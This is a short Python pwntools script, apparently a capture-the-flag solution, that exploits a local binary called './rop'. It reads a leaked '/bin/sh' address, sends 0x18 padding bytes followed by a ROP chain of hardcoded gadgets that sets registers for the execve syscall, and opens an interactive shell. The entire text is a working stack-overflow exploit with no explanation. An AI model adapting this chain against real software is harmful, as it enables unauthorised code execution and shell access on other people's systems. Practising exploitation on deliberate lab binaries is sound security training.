from pwn import *

context.arch = 'amd64'

r = process('./rop')
raw_input()
#gdb.attach(r)
r.recvuntil('Here is your "/bin/sh": ')
binsh =int(r.recvline()[:-1], 16)
info(f"binsh: {hex(binsh)}")

pop_rdi_ret = 0x401eaf
pop_rsi_ret = 0x409ede
pop_rdx_ret = 0x485aeb
pop_rax_ret = 0x44fcc7
syscall = 0x401c64

ROP = flat(
    pop_rdi_ret, binsh, 
    pop_rsi_ret, 0,
    pop_rdx_ret, 0, 0, 
    pop_rax_ret, 0x3b,
    syscall,
)

#gdb.attach(r)
r.sendafter("Give me your ROP: ", b'a' * 0x18 + ROP)

r.interactive()
